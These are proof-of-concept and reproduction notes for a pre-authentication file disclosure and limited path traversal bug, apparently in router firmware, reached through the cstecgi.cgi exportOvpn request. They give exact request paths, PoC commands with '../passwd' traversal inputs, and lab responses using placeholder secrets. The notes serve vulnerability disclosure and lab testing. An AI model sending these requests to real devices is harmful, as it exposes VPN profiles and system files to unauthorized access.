# PoC and Reproduction Notes

## Scope

This PoC is for authorized testing only. It demonstrates pre-authenticated access to the `exportOvpn` branch and suffix-constrained path traversal behavior.

## PoC File

```text
poc_pre_auth_file_disclosure.py
```

## Request Forms

OpenVPN profile export:

```text
/cgi-bin/cstecgi.cgi?exportOvpn&type=user&name=<username>&mode=config
```

OpenVPN archive export:

```text
/cgi-bin/cstecgi.cgi?exportOvpn&type=user&name=<username>&filetype=gz
```

The parameter order is important because the CGI parser uses fixed positions.

## Example Commands

Generate a request path only:

```bash
python poc_pre_auth_file_disclosure.py http://192.168.0.1 --user alice --path-only
```

Fetch an OpenVPN profile:

```bash
python poc_pre_auth_file_disclosure.py http://192.168.0.1 --user alice
```

Fetch an OpenVPN `.tar.gz` archive:

```bash
python poc_pre_auth_file_disclosure.py http://192.168.0.1 --user alice --gz
```

Test limited traversal:

```bash
python poc_pre_auth_file_disclosure.py http://192.168.0.1 --user ../passwd
python poc_pre_auth_file_disclosure.py http://192.168.0.1 --user ../passwd --gz
```

## Expected Laboratory Evidence

Representative QEMU/chroot responses:

```text
HTTP/1.1 200 OK
OVPN_SECRET_FOR_ALICE
```

```text
HTTP/1.1 200 OK
TARGZ_SECRET_FOR_ALICE
```

```text
HTTP/1.1 200 OK
TRAVERSAL_SECRET
```

```text
HTTP/1.1 200 OK
TRAVERSAL_GZ_SECRET
```

## Validation Note

The laboratory harness used original firmware binaries and libraries. Representative OpenVPN export files were pre-created in a temporary rootfs to model a configured device runtime state.

The firmware images do not ship with user-generated OpenVPN profiles by default; therefore, real-world impact depends on OpenVPN being enabled or export files being generated on the device.

